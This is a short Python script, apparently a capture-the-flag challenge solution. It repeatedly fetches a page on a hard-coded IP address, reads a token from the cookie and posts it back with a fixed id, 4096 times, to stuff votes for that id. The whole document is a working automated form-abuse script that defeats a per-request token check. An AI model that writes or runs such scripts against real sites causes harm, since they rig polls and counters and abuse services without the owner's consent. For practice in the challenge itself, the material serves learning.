#!/usr/bin/python3
if __name__ == "__main__":
    import requests

    API_ENDPOINT = "http://158.69.76.135/level1.php"
    s = requests.Session()
    for i in range(0, 4096):
        r = s.get(API_ENDPOINT);
        for c in r.cookies:
            key = c.value
        data = {"id":"1300", "holdthedoor":"Submit", "key":key}
        r = s.post(url = API_ENDPOINT, data = data)
